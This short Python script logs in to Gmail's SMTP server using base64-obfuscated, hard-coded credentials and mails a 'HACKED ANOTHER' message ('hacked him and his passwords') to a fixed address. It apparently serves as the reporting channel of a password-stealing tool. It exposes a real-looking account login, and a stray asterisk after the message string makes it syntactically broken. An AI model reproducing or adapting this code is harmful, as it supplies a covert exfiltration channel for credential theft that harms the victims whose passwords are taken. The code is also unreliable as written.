import smtplib
import base64


username = 'a2E0bWFsZWFybmVyQGdtYWlsLmNvbQ=='
password = 'QEtleWFhbjc4Ng=='


with smtplib.SMTP('smtp.gmail.com',587) as smtp:
	smtp.ehlo() # Identifies us with mail server not imp
	smtp.starttls() #encrypting the connection
	smtp.ehlo() #Identify again
	username = base64.b64decode(username)
	password = base64.b64decode(password)
	username = str(username)[2:-1]
	password = str(password)[2:-1]
	smtp.login(username, password)

	subject = 'HACKED ANOTHER'
	body = '''hacked
	him and his passwords'''*

	msg = f'Subject: {subject}\n\n{body}'

	smtp.sendmail(username, 'keyaanminhas@gmail.com', msg)
	
